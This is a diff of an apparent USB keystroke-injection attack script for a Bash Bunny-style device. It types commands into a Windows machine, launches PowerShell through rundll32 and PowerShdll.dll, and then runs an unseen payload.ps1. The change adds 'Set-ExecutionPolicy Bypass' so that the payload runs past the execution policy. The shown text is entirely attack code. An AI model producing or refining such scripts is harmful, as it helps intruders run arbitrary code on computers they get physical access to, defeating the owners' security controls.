@@ -75,17 +75,14 @@ LED STAGE3
 Q STRING "rundll32 .\PowerShdll.dll,main -n -w"
 Q ENTER
 Q DELAY 7000
-Q STRING ".\payload.ps1"
+Q STRING "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser; .\payload.ps1"
 Q ENTER
 Q DELAY 7000
 Q LEFTARROW
 Q DELAY 1500
 Q ENTER
 Q DELAY 7000
-Q STRING "CD \$env:UserProfile"
-Q ENTER
-Q DELAY 1500
-Q STRING ".\payload.ps1"
+Q STRING "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser; CD \$env:UserProfile; .\payload.ps1"
 Q ENTER
 
 ######## FINISH ########
